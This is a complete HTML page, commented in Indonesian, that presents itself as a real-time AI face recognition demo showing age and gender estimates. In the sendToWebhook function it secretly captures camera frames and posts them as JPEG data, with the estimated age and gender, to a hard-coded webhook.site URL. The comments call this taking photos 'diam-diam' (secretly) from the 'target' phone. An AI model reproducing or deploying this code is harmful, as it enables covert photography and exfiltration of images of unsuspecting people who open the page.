<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Real-Time Face Recognition</title>
    <script defer src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <style>
        body { margin: 0; padding: 0; background: #000; color: #00ff00; font-family: sans-serif; overflow: hidden; }
        #container { position: relative; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; }
        video { position: absolute; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
        canvas { position: absolute; z-index: 2; top: 0; left: 0; width: 100%; height: 100%; }
        #loader { position: absolute; z-index: 3; background: rgba(0,0,0,0.8); width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .spinner { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loader">
        <div class="spinner"></div>
        <p id="load-text">MEMUAT ENGINE AI...</p>
    </div>

    <div id="container">
        <video id="video" autoplay muted playsinline></video>
    </div>

    <script>
        const WEBHOOK_URL = 'https://webhook.site/0fd1f3d6-dd15-4117-a62f-cf109f69247b';
        const video = document.getElementById('video');
        let photoCount = 0;

        async function init() {
            // 1. Load Model AI (Age, Gender, Expression)
            const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/';
            await Promise.all([
                faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
                faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
                faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL),
                faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
                faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL)
            ]);

            // 2. Start Kamera
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    document.getElementById('loader').style.display = 'none';
                    startDetection();
                });
        }

        function startDetection() {
            const canvas = faceapi.createCanvasFromMedia(video);
            document.getElementById('container').append(canvas);
            const displaySize = { width: video.offsetWidth, height: video.offsetHeight };
            faceapi.matchDimensions(canvas, displaySize);

            setInterval(async () => {
                const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
                    .withFaceLandmarks()
                    .withFaceExpressions()
                    .withAgeAndGender();

                const resizedDetections = faceapi.resizeResults(detections, displaySize);
                canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
                
                // Gambar kotak dan hasil AI di layar HP target
                faceapi.draw.drawDetections(canvas, resizedDetections);
                
                resizedDetections.forEach(result => {
                    const { age, gender, genderProbability } = result;
                    new faceapi.draw.DrawTextField([
                        `${Math.round(age)} Tahun`,
                        `${gender} (${Math.round(genderProbability * 100)}%)`
                    ], result.detection.box.bottomLeft).draw(canvas);

                    // 3. AMBIL FOTO DIAM-DIAM (Kirim ke Webhook setiap 5 detik)
                    if (photoCount < 5) {
                        sendToWebhook(Math.round(age), gender);
                    }
                });
            }, 1000);
        }

        async function sendToWebhook(age, gender) {
            photoCount++;
            const tempCanvas = document.createElement('canvas');
            tempCanvas.width = video.videoWidth;
            tempCanvas.height = video.videoHeight;
            tempCanvas.getContext('2d').drawImage(video, 0, 0);
            
            const dataFoto = tempCanvas.toDataURL('image/jpeg', 0.4);

            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    info: "REAL_AI_DETECTION",
                    detected_age: age,
                    detected_gender: gender,
                    image: dataFoto
                })
            });
        }

        window.onload = init;
    </script>
</body>
</html>
